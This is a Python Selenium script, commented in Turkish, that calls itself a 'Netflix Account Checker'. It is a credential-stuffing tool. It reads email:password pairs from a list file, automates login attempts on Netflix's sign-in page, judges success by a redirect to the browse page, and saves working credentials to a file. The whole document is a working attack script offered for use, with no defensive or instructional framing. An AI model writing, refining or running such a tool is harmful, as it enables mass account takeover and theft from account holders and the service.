from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from rich.console import Console
import time

# Rich console nesnesini oluştur
console = Console()

console.print("[bold cyan][+]---Netflix Account Checker v0.2---[+][/bold cyan]")
time.sleep(2)

# Geçerli ve geçersiz hesapları tutacak değişkenler
valid_count = 0
invalid_count = 0

valid_accounts = []  # Geçerli hesapların tutulacağı liste
outfile = open('netflix_worksAcc.txt', 'w')

# Selenium WebDriver başlatma
console.print("[bold yellow]Selenium WebDriver başlatılıyor...[/bold yellow]")
driver = webdriver.Chrome()  # veya Firefox, Edge vb.
driver.get('https://www.netflix.com/login')

# Hesapları kontrol etmek için fonksiyon
def check_account(email, password):
    global valid_count, invalid_count
    try:
        # E-posta ve şifre alanlarını bulma
        email_field = driver.find_element(By.NAME, 'userLoginId')
        password_field = driver.find_element(By.NAME, 'password')

        # Giriş bilgilerini girme
        email_field.send_keys(email)
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)  # Enter tuşuna basma

        time.sleep(5)  # Giriş işleminin tamamlanmasını bekleyin

        # Başarılı giriş kontrolü
        if driver.current_url == 'https://www.netflix.com/browse':
            console.print(f"[bold green][+] {email}:{password} - Geçerli[/bold green]")  # Geçerli hesap
            valid_count += 1
            valid_accounts.append(f"{email}:{password}")  # Geçerli hesapları kaydet
            driver.get('https://www.netflix.com/SignOut?lnkctr=mL')  # Çıkış yap
            time.sleep(2)
        else:
            console.print(f"[bold red][+] {email}:{password} - Geçersiz[/bold red]")  # Geçersiz hesap
            invalid_count += 1

        # Sayfayı yenileyerek sonraki hesaba geçme
        driver.refresh()
        time.sleep(2)

    except Exception as e:
        console.print(f"[bold yellow]Hata: {e} - {email}:{password}[/bold yellow]")
        driver.refresh()
        time.sleep(2)

# Hesapları topluca kontrol etme fonksiyonu
def check_accounts():
    global valid_count, invalid_count
    try:
        with open("listAcc.txt", "r") as filestream:  # listAcc.txt dosyasındaki hesapları oku
            for line in filestream:
                email, password = line.strip().split(':')  # : ile ayırma
                check_account(email, password)  # Hesapları kontrol et

        # Geçerli hesapları dosyaya yaz
        console.print("[bold cyan]Geçerli hesaplar dosyaya yazılıyor...[/bold cyan]")
        for account in valid_accounts:
            outfile.write(account + '\n')

    except Exception as e:
        console.print(f"[bold red]Bir hata oluştu: {e}[/bold red]")
        console.print("[bold cyan]İlerleme kaydediliyor...[/bold cyan]")
        for account in valid_accounts:
            outfile.write(account + '\n')

    console.print("\n[bold green]Geçerli hesaplar:[/bold green]", valid_count)
    console.print("[bold red]Geçersiz hesaplar:[/bold red]", invalid_count)

# Çalıştırma
if __name__ == "__main__":
    check_accounts()

    # WebDriver'ı kapatma
    console.print("[bold cyan]WebDriver kapatılıyor...[/bold cyan]")
    driver.quit()

    # Kullanıcı kapatana kadar bekle
    console.print("[bold magenta]Sonuçları görmek için Enter tuşuna basın...[/bold magenta]")
    input()